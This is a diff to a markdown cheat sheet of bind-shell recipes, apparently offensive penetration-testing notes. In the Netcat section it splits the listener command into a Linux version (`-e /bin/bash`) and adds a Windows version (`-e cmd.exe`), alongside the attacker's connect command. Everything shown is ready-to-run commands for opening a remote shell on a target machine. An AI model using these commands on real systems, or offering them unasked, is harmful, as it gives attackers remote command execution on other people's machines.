@@ -26,7 +26,8 @@ Recipes for bind shells from A to target B:
 
 ### Netcat
 A: `nc -nv $B_IP $PORT`  
-B: `nc -nlvp $PORT -e /bin/bash`  
+B (Linux): `nc -nlvp $PORT -e /bin/bash`  
+B (Windows): `nc -nlvp $PORT -e cmd.exe`  
 
 ### Socat
 #### Unencrypted
